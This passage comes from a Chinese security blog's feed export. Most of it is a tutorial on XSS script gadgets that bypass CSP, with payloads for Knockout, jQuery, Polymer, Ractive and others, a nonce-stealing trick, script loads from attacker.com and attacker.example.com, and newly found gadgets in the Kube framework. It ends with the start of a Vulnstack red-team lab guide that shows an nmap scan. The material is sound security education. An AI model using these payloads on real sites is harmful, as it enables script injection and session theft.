执行上述脚本</span></span><br><span class="line"><span class="keyword">return</span> <span class="title function_">bindingFunction</span>(bindingContext, node);</span><br></pre></td></tr></table></figure>

<p>所以可以构造如下语句进行注入</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">data-bind</span>=<span class="string">&quot;value: alert(1)&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="产生原因"><a href="#产生原因" class="headerlink" title="产生原因"></a>产生原因</h3><ul>
<li>通过表达式解析器来进行non-eval</li>
<li>自定义的表达式解析器安全风险</li>
<li>表达式可被“动态编译”成Javascript</li>
<li>代码直接操作在DOM元素、属性或原生对象等</li>
<li>有足够多的复合表达式语言</li>
</ul>
<h3 id="历史漏洞"><a href="#历史漏洞" class="headerlink" title="历史漏洞"></a>历史漏洞</h3><ul>
<li><p><strong>Knockout</strong>属性绑定注入</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">data-bind</span>=<span class="string">&quot;value: alert(1)&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>代码分析</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 获取data-bind属性</span></span><br><span class="line"><span class="keyword">switch</span> (node.<span class="property">nodeType</span>) &#123;</span><br><span class="line"> <span class="keyword">case</span> <span class="number">1</span>: <span class="keyword">return</span> node.<span class="title function_">getAttribute</span>(<span class="string">&quot;data-bind&quot;</span>);</span><br><span class="line"><span class="comment">// 写入到rewrittenBindings</span></span><br><span class="line"><span class="keyword">var</span> rewrittenBindings = ko.<span class="property">expressionRewriting</span>.<span class="title function_">preProcessBindings</span>(bindingsString, options),</span><br><span class="line"> functionBody = <span class="string">&quot;with($context)&#123;with($data||&#123;&#125;)&#123;return&#123;&quot;</span> + rewrittenBindings + <span class="string">&quot;&#125;&#125;&#125;&quot;</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Function</span>(<span class="string">&quot;$context&quot;</span>, <span class="string">&quot;$element&quot;</span>, functionBody);</span><br><span class="line"><span class="comment">// 执行上述脚本</span></span><br><span class="line"><span class="keyword">return</span> <span class="title function_">bindingFunction</span>(bindingContext, node);</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>Ajaxify</strong>将文本进行类型转换</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;document-script&quot;</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>代码分析</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 获取document-script</span></span><br><span class="line">$scripts = $dataContent.<span class="title function_">find</span>(<span class="string">&#x27;.document-script&#x27;</span>);</span><br><span class="line"><span class="comment">// 添加script</span></span><br><span class="line">$scripts.<span class="title function_">each</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> $script = $(<span class="variable language_">this</span>), scriptText = $script.<span class="title function_">text</span>(), scriptNode = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;script&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( $script.<span class="title function_">attr</span>(<span class="string">&#x27;src&#x27;</span>) ) &#123;</span><br><span class="line">        <span class="keyword">if</span> ( !$script[<span class="number">0</span>].<span class="property">async</span> ) &#123; scriptNode.<span class="property">async</span> = <span class="literal">false</span>; &#125;</span><br><span class="line">        scriptNode.<span class="property">src</span> = $script.<span class="title function_">attr</span>(<span class="string">&#x27;src&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">        scriptNode.<span class="title function_">appendChild</span>(<span class="variable language_">document</span>.<span class="title function_">createTextNode</span>(scriptText));</span><br><span class="line">    contentNode.<span class="title function_">appendChild</span>(scriptNode);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>Bootstrap-simplest</strong>直接插入html代码</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">data-toggle</span>=<span class="string">tooltip</span> <span class="attr">data-html</span>=<span class="string">true</span> <span class="attr">title</span>=<span class="string">&#x27;&lt;script&gt;alert(1)&lt;/script&gt;&#x27;</span>&gt;</span>aaaa<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">nonce</span>=<span class="string">&quot;random&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  $(<span class="string">&quot;[data-toggle=tooltip]&quot;</span>).<span class="title function_">tooltip</span>();</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>限制条件比较严格，tooltip的title可控且tooltip调用了<code>tooltip()</code></p>
<p>代码分析</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 初始化控件</span></span><br><span class="line"><span class="variable language_">this</span>.<span class="title function_">init</span>(<span class="string">&#x27;tooltip&#x27;</span>, element, options)</span><br><span class="line"><span class="comment">// 显示控件</span></span><br><span class="line"><span class="keyword">if</span> (!self.<span class="property">options</span>.<span class="property">delay</span> || !self.<span class="property">options</span>.<span class="property">delay</span>.<span class="property">show</span>) <span class="keyword">return</span> self.<span class="title function_">show</span>()</span><br><span class="line"><span class="comment">// 直接插入节点</span></span><br><span class="line"><span class="variable language_">this</span>.<span class="property">options</span>.<span class="property">container</span> ? $tip.<span class="title function_">appendTo</span>(<span class="variable language_">this</span>.<span class="property">options</span>.<span class="property">container</span>) : $tip.<span class="title function_">insertAfter</span>(<span class="variable language_">this</span>.<span class="property">$element</span>)</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>Closure</strong>混淆闭包引入自定义js</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">CLOSURE_BASE_PATH</span> <span class="attr">href</span>=<span class="string">data:/,1/alert(1)//</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">CLOSURE_UNCOMPILED_DEFINES</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">goog.ENABLE_CHROME_APP_SAFE_SCRIPT_LOADING</span>&gt;</span><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>Require JS</strong>允许自定义js文件</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">data-main</span>=<span class="string">&#x27;data:1,alert(1)&#x27;</span> <span class="attr">src</span>=<span class="string">&#x27;require.js&#x27;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>代码分析</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 获取data-main属性</span></span><br><span class="line">dataMain = script.<span class="title function_">getAttribute</span>(<span class="string">&#x27;data-main&#x27;</span>);</span><br><span class="line"><span class="comment">// 加载为配置文件</span></span><br><span class="line">cfg.<span class="property">deps</span> = cfg.<span class="property">deps</span> ? cfg.<span class="property">deps</span>.<span class="title function_">concat</span>(mainScript) : [mainScript];</span><br><span class="line"><span class="comment">// 加载配置文件</span></span><br><span class="line">req.<span class="property">config</span> = <span class="keyword">function</span> (<span class="params">config</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">req</span>(config);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>Ember</strong>允许动态插入script</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">text/x-handlebars</span>&gt;</span><span class="language-handlebars"><span class="language-xml"></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"> <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">//attacker.example.com//</span> /&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"></span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>代码分析</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 提取text/x-handlebars标签</span></span><br><span class="line"><span class="keyword">var</span> selector = <span class="string">&#x27;script[type=&quot;text/x-handlebars&quot;]&#x27;</span>;</span><br><span class="line"><span class="comment">// 设置模板</span></span><br><span class="line"><span class="title function_">setTemplate</span>(templateName, template);</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>JQuery</strong>重插入script</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">class</span>=<span class="string">&quot;child&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;ownerDocument&quot;</span>/&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1);<span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>代码分析</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 插入下一个节点</span></span><br><span class="line"><span class="variable language_">this</span>.<span class="property">parentNode</span>.<span class="title function_">insertBefore</span>( elem, <span class="variable language_">this</span>.<span class="property">nextSibling</span> );</span><br><span class="line"><span class="comment">// 运行插入代码</span></span><br><span class="line"><span class="title class_">DOMEval</span>( node.<span class="property">textContent</span>.<span class="title function_">replace</span>( rcleanScript, <span class="string">&quot;&quot;</span> ), doc );</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>jQuery Mobile</strong>通过HTML注入闭合注释</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">data-role</span>=<span class="string">popup</span> <span class="attr">id</span>=<span class="string">&#x27;--&gt;&lt;script&gt;&quot;use strict&quot;</span></span></span><br><span class="line"><span class="string"><span class="tag">alert(1)&lt;/script&gt;&#x27;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>代码分析</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 代码拼接直接插入html</span></span><br><span class="line"><span class="keyword">if</span> ( myId ) &#123;</span><br><span class="line">    ui.<span class="property">screen</span>.<span class="title function_">attr</span>( <span class="string">&quot;id&quot;</span>, myId + <span class="string">&quot;-screen&quot;</span> );</span><br><span class="line">    ui.<span class="property">container</span>.<span class="title function_">attr</span>( <span class="string">&quot;id&quot;</span>, myId + <span class="string">&quot;-popup&quot;</span> );</span><br><span class="line">    ui.<span class="property">placeholder</span></span><br><span class="line">        .<span class="title function_">attr</span>( <span class="string">&quot;id&quot;</span>, myId + <span class="string">&quot;-placeholder&quot;</span> )</span><br><span class="line">        .<span class="title function_">html</span>( <span class="string">&quot;&lt;!-- placeholder for &quot;</span> + myId + <span class="string">&quot; --&gt;&quot;</span> );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>Aurelia</strong>利用本地函数创建script</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">ref</span>=<span class="string">&quot;me&quot;</span></span></span><br><span class="line"><span class="tag"><span class="attr">s.bind</span>=<span class="string">&quot;$this.me.ownerDocument.createElement(&#x27;script&#x27;)&quot;</span></span></span><br><span class="line"><span class="tag"><span class="attr">data-bar</span>=<span class="string">&quot;$&#123;$this.me.s.src=&#x27;data:,alert(1)&#x27;&#125;&quot;</span></span></span><br><span class="line"><span class="tag"><span class="attr">data-foobar</span>=<span class="string">&quot;$&#123;$this.me.ownerDocument.body.appendChild($this.me.s)&#125;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>Polymer 1.x</strong>重写“私人”下划线属性</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span> <span class="attr">is</span>=<span class="string">dom-bind</span>&gt;</span><span class="tag">&lt;<span class="name">div</span></span></span><br><span class="line"><span class="tag"><span class="attr">five</span>=<span class="string">&#123;&#123;insert(me._nodes.0.scriptprop)&#125;&#125;</span></span></span><br><span class="line"><span class="tag"><span class="attr">four</span>=<span class="string">&quot;&#123;&#123;set(&#x27;insert&#x27;,me.root.ownerDocument.body.appendChild)&#125;&#125;&quot;</span></span></span><br><span class="line"><span class="tag"><span class="attr">three</span>=<span class="string">&quot;&#123;&#123;set(&#x27;me&#x27;,nextSibling.previousSibling)&#125;&#125;&quot;</span></span></span><br><span class="line"><span class="tag"><span class="attr">two</span>=<span class="string">&#123;&#123;set(</span>&#x27;<span class="attr">_nodes.0.scriptprop.src</span>&#x27;,&#x27;<span class="attr">data:</span>\,<span class="attr">alert</span>(<span class="attr">1</span>)&#x27;)&#125;&#125;</span></span><br><span class="line"><span class="tag"><span class="attr">scriptprop</span>=<span class="string">&#123;&#123;_factory()&#125;&#125;</span></span></span><br><span class="line"><span class="tag"><span class="attr">one</span>=<span class="string">&#123;&#123;set(</span>&#x27;<span class="attr">_factoryArgs.0</span>&#x27;,&#x27;<span class="attr">script</span>&#x27;)&#125;&#125; &gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>Ractive</strong>引入任意js、窃取nonce</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">id</span>=<span class="string">&#x27;template&#x27;</span> <span class="attr">type</span>=<span class="string">&#x27;text/ractive&#x27;</span>&gt;</span><span class="language-handlebars"><span class="language-xml"></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">	<span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&#x27;//attacker.com/shout/&#x27;</span> /&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"></span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">id</span>=<span class="string">&#x27;template&#x27;</span> <span class="attr">type</span>=<span class="string">&#x27;text/ractive&#x27;</span>&gt;</span><span class="language-handlebars"><span class="language-xml"></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">      <span class="tag">&lt;<span class="name">iframe</span> <span class="attr">srcdoc</span>=<span class="string">&#x27;&lt;script</span></span></span></span></span><br><span class="line"><span class="string"><span class="tag"><span class="language-xml"><span class="language-handlebars">      nonce=</span></span></span><span class="template-variable">&#123;&#123;@<span class="name">global.document.currentScript.nonce</span>&#125;&#125;</span><span class="language-xml"><span class="tag"><span class="string">&gt;</span></span></span></span></span><br><span class="line"><span class="string"><span class="tag"><span class="language-xml"><span class="language-handlebars">      alert(document.domain)</span></span></span></span></span><br><span class="line"><span class="string"><span class="tag"><span class="language-xml"><span class="language-handlebars">      &lt;/</span></span></span><span class="template-variable">&#123;&#123;&#125;&#125;</span><span class="language-xml"><span class="tag"><span class="string">script&gt;&#x27;</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">      <span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"></span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>代码分析</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 获取模板</span></span><br><span class="line"><span class="keyword">if</span> (!(template = doc.<span class="title function_">getElementById</span>(id))) &#123;</span><br><span class="line">    <span class="keyword">if</span> (options &amp;&amp; options.<span class="property">noThrow</span>) &#123;</span><br><span class="line">    	<span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">`Could not find template element with id #<span class="subst">$&#123;id&#125;</span>`</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">// 返回模板</span></span><br><span class="line"><span class="keyword">return</span> <span class="string">&#x27;textContent&#x27;</span> <span class="keyword">in</span> template ? template.<span class="property">textContent</span> : template.<span class="property">innerHTML</span>;</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="漏洞挖掘"><a href="#漏洞挖掘" class="headerlink" title="漏洞挖掘"></a>漏洞挖掘</h3><p>Sink RegEx Mode</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">eval\(</span><br><span class="line">\.innerHTML</span><br><span class="line">\.html\(</span><br><span class="line">Function\(</span><br><span class="line">document\.createElement\(</span><br><span class="line">scriptElement\.src</span><br><span class="line">\.appendChild\(</span><br><span class="line">inputFunction\.apply\(</span><br><span class="line">\.insertAdjacentHTML\(</span><br></pre></td></tr></table></figure>

<p>我们这次的挖掘目标是<a href="https://github.com/imperavi/kube">Kube</a>，一个轻量的CSS框架</p>
<hr>
<p><em><em>data-</em> Atrribute Gadget</em>*</p>
<p>根据<code>Knockout Gadget</code>的思路查找是否存在函数构造</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">RegEx: /new Function\(/i</span><br></pre></td></tr></table></figure>

<p>漏洞链如下</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 对data属性进行检查</span></span><br><span class="line"><span class="attr">data</span>: <span class="keyword">function</span>(<span class="params">name, value</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (name === <span class="literal">undefined</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">var</span> reDataAttr = <span class="regexp">/^data\-(.+)$/</span>;</span><br><span class="line">        <span class="keyword">var</span> attrs = <span class="variable language_">this</span>.<span class="title function_">get</span>().<span class="property">attributes</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> data = &#123;&#125;;</span><br><span class="line">        <span class="keyword">var</span> replacer = <span class="keyword">function</span> (<span class="params">g</span>) &#123; <span class="keyword">return</span> g[<span class="number">1</span>].<span class="title function_">toUpperCase</span>(); &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> key <span class="keyword">in</span> attrs)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (attrs[key] &amp;&amp; reDataAttr.<span class="title function_">test</span>(attrs[key].<span class="property">nodeName</span>))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">var</span> dataName = attrs[key].<span class="property">nodeName</span>.<span class="title function_">match</span>(reDataAttr)[<span class="number">1</span>];</span><br><span class="line">                <span class="keyword">var</span> val = attrs[key].<span class="property">value</span>; <span class="comment">// Source</span></span><br><span class="line">                dataName = dataName.<span class="title function_">replace</span>(<span class="regexp">/-([a-z])/g</span>, replacer);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="title function_">_isObjectString</span>(val)) val = <span class="variable language_">this</span>.<span class="title function_">_toObject</span>(val);</span><br><span class="line">                <span class="keyword">else</span> val = (<span class="variable language_">this</span>.<span class="title function_">_isNumber</span>(val)) ? <span class="built_in">parseFloat</span>(val) : <span class="variable language_">this</span>.<span class="title function_">_getBooleanFromStr</span>(val);</span><br><span class="line"></span><br><span class="line">                data[dataName] = val;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> data;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">attr</span>(name, value, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 判断是否为对象字符串</span></span><br><span class="line"><span class="attr">_isObjectString</span>: <span class="keyword">function</span>(<span class="params">str</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> (str.<span class="title function_">search</span>(<span class="regexp">/^&#123;/</span>) !== -<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将字符串转为对象</span></span><br><span class="line"><span class="attr">_toObject</span>: <span class="keyword">function</span>(<span class="params">str</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">new</span> <span class="title class_">Function</span>(<span class="string">&quot;return &quot;</span> + str))(); <span class="comment">// Sink</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>payload构造显然易见，直接找一个有<code>data-*</code>属性的空间，然后注入一个字典就好</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">content-security-policy</span> <span class="attr">content</span>=<span class="string">&quot;script-src &#x27;nonce-random&#x27; &#x27;unsafe-eval&#x27; &#x27;strict-dynamic&#x27;; &quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">data-name</span>=<span class="string">&quot;&#123;tyao:alert(1)&#125;&quot;</span> <span class="attr">data-kube</span>=<span class="string">&quot;alert&quot;</span>&gt;</span>xss<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">nonce</span>=<span class="string">&quot;random&quot;</span> <span class="attr">src</span>=<span class="string">&quot;kube/dist/js/kube.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">nonce</span>=<span class="string">&quot;random&quot;</span>&gt;</span></span><br><span class="line">    $K.init();</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>data-target Atrribute Gadget</strong></p>
<blockquote>
<p>这个比较鸡肋，绕不过<code>nonce</code>机制</p>
</blockquote>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">    <span class="attr">_buildElement</span>: <span class="keyword">function</span>(<span class="params">$el</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">App</span>.<span class="title class_">Element</span>(<span class="variable language_">this</span>.<span class="property">app</span>, $el);</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">_buildTarget</span>: <span class="keyword">function</span>(<span class="params"></span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">App</span>.<span class="title class_">Target</span>(<span class="variable language_">this</span>.<span class="property">app</span>, <span class="variable language_">this</span>.<span class="property">params</span>.<span class="property">target</span>); <span class="comment">// Source</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="attr">create</span>: <span class="keyword">function</span>(<span class="params">html</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="regexp">/^&lt;(\w+)\s*\/?&gt;(?:&lt;\/\1&gt;|)$/</span>.<span class="title function_">test</span>(html))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> [<span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="title class_">RegExp</span>.<span class="property">$1</span>)];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> elements = [];</span><br><span class="line">    <span class="keyword">var</span> container = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;div&#x27;</span>);</span><br><span class="line">    <span class="keyword">var</span> children = container.<span class="property">childNodes</span>;</span><br><span class="line"></span><br><span class="line">    container.<span class="property">innerHTML</span> = html; <span class="comment">// Sink</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>, l = children.<span class="property">length</span>; i &lt; l; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        elements.<span class="title function_">push</span>(children[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> elements;</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure>

<p>在<code>data-target</code>属性注入</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">data-target</span>=<span class="string">&quot;<span class="symbol">&amp;lt;</span>img src onerror=alert(1)<span class="symbol">&amp;gt;</span>&quot;</span> <span class="attr">data-kube</span>=<span class="string">&quot;alert&quot;</span>&gt;</span>xss<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">nonce</span>=<span class="string">&quot;random&quot;</span> <span class="attr">src</span>=<span class="string">&quot;kube/dist/js/kube.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">nonce</span>=<span class="string">&quot;random&quot;</span>&gt;</span></span><br><span class="line">    $K.init();</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>



<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://zhuanlan.zhihu.com/p/55836826">深入理解output buffer</a></p>
<p><a href="https://xz.aliyun.com/t/4165">基于Gadgets绕过XSS防御机制</a></p>
<p><a href="https://blog.szfszf.top/article/32/">CSP 概念及绕过分析总结</a></p>
<p><a href="https://www.cnblogs.com/wangtanzhi/p/12609570.html#autoid-0-9-0">XSS之CSP绕过(转）</a></p>
<p><a href="https://www.freebuf.com/articles/web/133455.html">通过浏览器缓存来bypass nonce script CSP</a></p>
]]></content>
      <tags>
        <tag>Bypass</tag>
      </tags>
  </entry>
  <entry>
    <title>Vulnstack 红队实战</title>
    <url>/2020/12/17/Vulnstack-%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98/</url>
    <content><![CDATA[<blockquote>
<p>找个时间简单学习一下内网渗透</p>
</blockquote>
<span id="more"></span>

<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>靶机地址：<a href="http://vulnstack.qiyuanxuetang.net/vuln/">http://vulnstack.qiyuanxuetang.net/vuln/</a></p>
<blockquote>
<p>建议使用百度云盘联动IDM下载</p>
</blockquote>
<p>靶机环境一共包括三台靶机，环境配置如下：</p>
<ol>
<li>Web服务器：win7（Windows 7 x64）<ul>
<li>网卡1：Host-Only</li>
<li>网卡2：NAT</li>
</ul>
</li>
<li>域成员：winserver 2003（Win2K3 Metasploitable）<ul>
<li>网卡1：Host-Only</li>
</ul>
</li>
<li>域控：winserver 2008（Windows Server 2008 R2 x64）<ul>
<li>网卡1：Host-Only</li>
</ul>
</li>
</ol>
<p>其网络拓扑如下：</p>
<img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2020121715371ccb488fef94c218bd76.png" alt="image-20201214095301999" style="zoom: 50%;" />

<p>搭建完成后，打开三个靶机，密码均为 <code>hongrisec@2019</code>，部分提示需要更新密码</p>
<p>然后进入win7启动phpStudy，我一开始打开是<code>KERNELBASE.dll</code>模块报错，Google了一下据说是因为dll编译错误，但是搜不到方法，然后我后面把备份的phpStudy恢复回来以后又可以启动了 : &gt;</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202012171538b35324abd3a58b69a20e.png" alt="image-20201214154411573"></p>
<p>发现三台靶机的内网网段在<code>192.168.52.0/24</code>，然后我这里的Web服务器的外网IP为<code>192.168.140.144</code></p>
<p>测试三台靶机都能互相ping同则表示搭建完成，ping不通的检测一下网段和网关是否正确，防火墙是否关闭</p>
<h2 id="攻击Web服务器"><a href="#攻击Web服务器" class="headerlink" title="攻击Web服务器"></a>攻击Web服务器</h2><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>主机探测</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -sP 192.168.140.0/24</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202012171538b35324abd3a58b69a20e.png" alt="image-20201214142412646"></p>
<p>端口扫描，建议masscan和nmap联动</p>
